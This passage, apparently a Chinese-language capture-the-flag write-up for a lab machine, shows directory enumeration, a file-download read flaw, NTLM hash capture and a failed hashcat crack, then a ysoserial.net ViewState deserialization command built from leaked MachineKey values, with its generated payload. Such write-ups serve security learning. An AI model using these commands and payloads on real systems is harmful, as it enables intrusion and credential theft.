+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exclude Length:          <span style="color:#ae81ff">188</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/index                <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 157<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/index<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/news                 <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 156<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/news<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 158<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/images<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/full                 <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 156<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/full<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/2006                 <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 156<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/2006<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/contact              <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 159<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/contact<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/download             <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 160<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/download<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/crack                <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 157<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/crack<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/serial               <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 158<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/serial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/12                   <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 154<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/12<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/warez                <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 157<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/warez<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/about                <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 157<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/about<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/logo                 <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 156<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/logo<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/search               <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 158<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/search<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/10                   <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 154<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/10<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/new                  <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 155<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/new<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/11                   <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 154<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/11<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/spacer               <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 158<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/spacer<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/cgi-bin              <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 159<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://dev.pov.htb/portfolio/cgi-bin<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>扫出过多的目录，暂时放弃，继续观察网站。网站上有关于 Stephen FItz 的详细介绍，他的编程语言偏好是 Js、ASP.NET、PHP。</p>
+<p><img src="Pasted%20image%2020260307160917.png" alt=""></p>
+<p>还有 What People Say About Me。</p>
+<p><img src="Pasted%20image%2020260307161026.png" alt=""></p>
+<p>其中 Michael Abra 说他的 ASP.NET 程序并不安全。</p>
+<p><img src="Pasted%20image%2020260307161129.png" alt=""></p>
+<p>使用 BurpSuite 抓包下载简历界面进行分析。</p>
+<p><img src="Pasted%20image%2020260307161857.png" alt=""></p>
+<p>发现参数部分有下载的简历 <code>cv.pdf</code>，尝试能否读取别的文件。</p>
+<p>可以读取 <code>hosts</code> 文件，尝试读取 <code>default.aspx</code> 文件。</p>
+<p><img src="Pasted%20image%2020260307211504.png" alt=""></p>
+<p>读取发现 <code>default.aspx</code> 文件还暴露了一个文件 <code>index.aspx.cs</code>，继续读取。</p>
+<p><img src="Pasted%20image%2020260307211610.png" alt=""></p>
+<p>这个源码是一个 ASP.NET 的文件下载后端处理程序，通过正则表达式过滤字符串来防止遍历。</p>
+<p><img src="Pasted%20image%2020260307211711.png" alt=""></p>
+<h2 id="ntlm-嗅探">NTLM 嗅探</h2>
+<p>在 Kali 中建立 smb 共享。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo impacket-smbserver Enil . -smb2support
+</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span></code></pre></div><p>在 Repeater 中发送请求至 Kali 主动产生流量，捕捉 ntlm 认证。</p>
+<p><img src="Pasted%20image%2020260307212459.png" alt=""></p>
+<p>使用 hashcat 破解捕捉到的 ntlmv2。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                                                                                                     
+</span></span><span style="display:flex;"><span>└─$ sudo hashcat -m <span style="color:#ae81ff">5600</span> <span style="color:#e6db74">&#34;sfitz::POV:aaaaaaaaaaaaaaaa:f81449b75ac6d8d067a4263a89017faf:0101000000000000809308c735aedc0133a733dccb3bd678000000000100100077004c00440043006a005900450
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">070000300100077004c00440043006a00590045007000020010006a0075005a0072005200410065005300040010006a0075005a007200520041006500530007000800809308c735aedc0106000400020000000800300030000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0000000000000000000002000003decb96a94ca9d11758ea5764f02eb4e13f900522ca6ff04c77af5c86f93aaa60a001000000000000000000000000000000000000900200063006900660073002f00310030002e003100300
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">02e00310036002e00350038000000000000000000&#34;</span> /usr/share/wordlists/rockyou.txt              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:                                                                                                                                                         
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting                                                                                                                                                         
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>OpenCL API <span style="color:#f92672">(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]                              </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====================================================================================================================================================</span>                              
+</span></span><span style="display:flex;"><span>* Device <span style="color:#75715e">#1: cpu-sandybridge-13th Gen Intel(R) Core(TM) i9-13900HX, 13912/27888 MB (4096 MB allocatable), 8MCU                                                                    </span>
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>                                                                                                                                    
+</span></span><span style="display:flex;"><span>Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>                                                                                                                                  
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts                                                                                                                               
+</span></span><span style="display:flex;"><span>Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates                                                                                                      
+</span></span><span style="display:flex;"><span>Rules: <span style="color:#ae81ff">1</span>                                                                                                                                                                          
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>Optimizers applied:                                                                      
+</span></span><span style="display:flex;"><span>* Zero-Byte                                                                                                                                                                       
+</span></span><span style="display:flex;"><span>* Not-Iterated                                                                                                                                                                    
+</span></span><span style="display:flex;"><span>* Single-Hash                                                                                                                                                                     
+</span></span><span style="display:flex;"><span>* Single-Salt                                                                                                                                                                     
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.                                                                                                                           
+</span></span><span style="display:flex;"><span>Pure kernels can crack longer passwords, but drastically reduce performance.                                                                                                      
+</span></span><span style="display:flex;"><span>If you want to switch to optimized kernels, append -O to your commandline.                                                                                                        
+</span></span><span style="display:flex;"><span>See the above message to find out about the exact limits.                                                                                                                         
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>Watchdog: Temperature abort trigger set to 90c                                           
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">2</span> MB                                               
+</span></span><span style="display:flex;"><span>                                                                                         
+</span></span><span style="display:flex;"><span>Dictionary cache hit:                       
+</span></span><span style="display:flex;"><span>* Filename..: /usr/share/wordlists/rockyou.txt                                           
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">14344385</span>                      
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">139921507</span>                     
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">14344385</span>                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Cracking performance lower than expected?                                                                                                                                         
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Append -O to the commandline.                                                          
+</span></span><span style="display:flex;"><span>  This lowers the maximum supported password/salt length <span style="color:#f92672">(</span>usually down to 32<span style="color:#f92672">)</span>.                                                                                                    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Append -w <span style="color:#ae81ff">3</span> to the commandline.                                                        
+</span></span><span style="display:flex;"><span>  This can cause your screen to lag.                                                     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Append -S to the commandline.                                                          
+</span></span><span style="display:flex;"><span>  This has a drastic speed impact but can be better <span style="color:#66d9ef">for</span> specific attacks.                                                                                                         
+</span></span><span style="display:flex;"><span>  Typical scenarios are a small wordlist but a large ruleset.                                                                                                                     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Update your backend API runtime / driver the right way:                                                                                                                         
+</span></span><span style="display:flex;"><span>  https://hashcat.net/faq/wrongdriver                                                    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Create more work items to make use of your parallelization power:                                                                                                               
+</span></span><span style="display:flex;"><span>  https://hashcat.net/faq/morework                                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Approaching final keyspace - workload adjusted.                                                                                                                                   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Session..........: hashcat                                                                                                                                                        
+</span></span><span style="display:flex;"><span>Status...........: Exhausted                                                             
+</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">5600</span> <span style="color:#f92672">(</span>NetNTLMv2<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>Hash.Target......: SFITZ::POV:aaaaaaaaaaaaaaaa:f81449b75ac6d8d067a4263...000000                                                                                                   
+</span></span><span style="display:flex;"><span>Time.Started.....: Sat Mar  <span style="color:#ae81ff">7</span> 08:27:42 <span style="color:#ae81ff">2026</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">5</span> secs<span style="color:#f92672">)</span>                                                                                                                              
+</span></span><span style="display:flex;"><span>Time.Estimated...: Sat Mar  <span style="color:#ae81ff">7</span> 08:27:47 <span style="color:#ae81ff">2026</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>                                                                                                                              
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel                                                           
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>                                                                                                                        
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>                                                         
+</span></span><span style="display:flex;"><span>Speed.#1.........:  2546.6 kH/s <span style="color:#f92672">(</span>1.38ms<span style="color:#f92672">)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8                                                                                                         
+</span></span><span style="display:flex;"><span>Recovered........: 0/1 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 0/1 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>                                                                                                         
+</span></span><span style="display:flex;"><span>Progress.........: 14344385/14344385 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>                                           
+</span></span><span style="display:flex;"><span>Rejected.........: 0/14344385 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>                                                    
+</span></span><span style="display:flex;"><span>Restore.Point....: 14344385/14344385 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>                                           
+</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1                                                                                                                             
+</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator                                                      
+</span></span><span style="display:flex;"><span>Candidates.#1....: $HEX<span style="color:#f92672">[</span>206b72697374656e616e6e65<span style="color:#f92672">]</span> -&gt; $HEX<span style="color:#f92672">[</span>042a0337c2a156616d6f732103<span style="color:#f92672">]</span>                                                                                             
+</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: Util: 63%                                                             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Started: Sat Mar  <span style="color:#ae81ff">7</span> 08:27:40 <span style="color:#ae81ff">2026</span>                                                        
+</span></span><span style="display:flex;"><span>Stopped: Sat Mar  <span style="color:#ae81ff">7</span> 08:27:49 <span style="color:#ae81ff">2026</span>
+</span></span></code></pre></div><p>破解失败。</p>
+<h2 id="枚举敏感信息">枚举敏感信息</h2>
+<p>枚举 web.config 的信息。</p>
+<p><img src="Pasted%20image%2020260307213822.png" alt=""></p>
+<p>这个 config 将错误重定向至 <code>portfolio</code> 界面，其中反序列化的硬编码 MachineKey 被暴露出来，使用 ysoseria.net 定制反序列化的 payload。</p>
+<h2 id="反序列化漏洞评估">反序列化漏洞评估</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>base<span style="color:#f92672">)</span> PS D:<span style="color:#ae81ff">\G</span>ithub Study<span style="color:#ae81ff">\Y</span>soserial<span style="color:#ae81ff">\y</span>soserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9<span style="color:#ae81ff">\R</span>elease&gt; .<span style="color:#ae81ff">\y</span>soserial.exe -p ViewState -g TextFormattingRunProperties -c <span style="color:#e6db74">&#34;ping -n 5 10.10.16.58&#34;</span> --path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/portfolio/default.aspx&#34;</span> --apppath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/portfolio&#34;</span> --decryptionalg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AES&#34;</span> --decryptionkey<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34;</span> --validationalg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SHA1&#34;</span> --validationkey<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;</span>
+</span></span><span style="display:flex;"><span>nPqQpSCSipKDKDRkvAbqlarE3rNhxwHi0V5sm%2FegatIQPOCTTuP%2FEzPeUBB5zY8jI808NeqanFQchAWdI%2Bpv5v%2FwhkB4eWZxP%2B%2FywwzGRpYP7qXWXoPi8Ekv%2B9eJAxCIkMGJKvk0ySLq0qhcX%2Fi2dkhY5f8aSLnOWs1O6LVEnEyFMgVa9H9piqSrGB2vjlftTAsu1Rfn7bCQ6lIBo5TkhSMZsuX%2F4w1asgGQwp5DXxisamN7RS%2FRg2N%2FiUMUBeCiM2Zp6GDn0GkYn1rnU9qpnaH%2FXXZWdZQ0iVOmq1WkylOoJIMRFDlSHahAjq73xxxVa%2BnOEtjmb1j7jcMgjgI9tP2fKa1GXiaXf%2FwvYF8k88bbFT%2FKKoTZnM4mqgd1Y50SI9L0ycIoYqNzVvlp9uQ5%2FZKagsAK2EM%2BU6lvcUbQplA5nZqyP8BUiWybT2rEKjjkffs7fSVpdBpebxBiH9Lj5%2BAhAgZhCDqHWwWolFLhiq7fKDd3wIpClRzwmVmgQ66yKfDWdqSr4RojC3841YVigGMHb7Oya565WYW1dJAeoDFr9WpIYoRqkdW6DyeeSfx%2BuEiShCcVnZK%2FD2KmFShcO97WihcJVaarmF4ceRMx4%2FQrfvIha9G1PxNH6732DFcW6C2YAbMPCn4UOyzDlcRP4ZT2oL5DNq3OVzO5kDLDOLvnD%2FipRbr4szmTJZ0MZzNQ2lr92z2iUWNYZV8AOy3E%2F8OJ01cft0C67QUpTIE5%2BN34qHDLCvalL1TOsJCE%2BSZxtZesb2DZjxMRTciWv%2BoF53TWWEUJwIZV%2F6EVQBA6ar9ptwfnxZ01K%2BR9%2F5RamrrGePOlqt8JDoJGl9BeVW16%2By%2FqS0nvEBC2MgapbRlHLguGHGEOMfLCxyfLeZhiU6BPxV6EvjFiMMs%2Bbs6Lin106TVXLjnw%2FPm7PVa%2BS1XL2PqiNZbsuZirWvR7FJChJPvJbEJz8Yvhd1oOJbajtIISeLWp5nXaVZmNxwXmxUgGAy9AoUNlvFQDUj7oIOpg6fRCFaFskIDmOZayJUBN4Nr4l7usLUUZIJPVp8AcVPcc%2FKMRgKRPxF5mj%2BSA%2FhR1syk91hVCst28UKZ6U8%2BbRYr40pEBH9PnsUSQ%2Fmo85quRlR12fB9RlUI%2FHOXYY61nfVXvUv4xX07XgdR5kvg7v7jjtdt3nptfeY6s6exQUEZlJ1r0tD9RCwkJtvCe8rLkZmYMyDcYk8WChqac86oDRpgLAY0jvfC3yb3hqZ%2BJMQOqtD6GcmiciAY27TZjgzlMc%2FpGSshcBwwJXzWepcCM%2BYG9XAdrJtc%3D
+</span></span></code></pre></div><p>在 Kali 中捕获流量。</p>
+<p><img src="Pasted%20image%2020260308000800.png" alt=""></p>
+<p>获取到 Ping 包，制作下一步的反弹 Shell。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"></code></pre></div>]]></content></item><item><title>Windows 提权专区</title><link>https://enilmalus.github.io/posts/windows-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/</link><pubDate>Mon, 02 Mar 2026 14:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/windows-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/</guid><description>枚举 systeminfo c:\windows\system32\inetsrv&amp;gt;systeminfo systeminfo Host Name: JSON OS Name: Microsoft Windows Server 2012 R2 Datacenter OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-80005-00001-AA602 Original Install Date: 5/22/2019, 4:27:16 PM System Boot Time: 3/1/2026, 8:27:41 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed.</description><content type="html"><![CDATA[<h2 id="枚举">枚举</h2>
 <h3 id="systeminfo">systeminfo</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;systeminfo
 </span></span><span style="display:flex;"><span>systeminfo
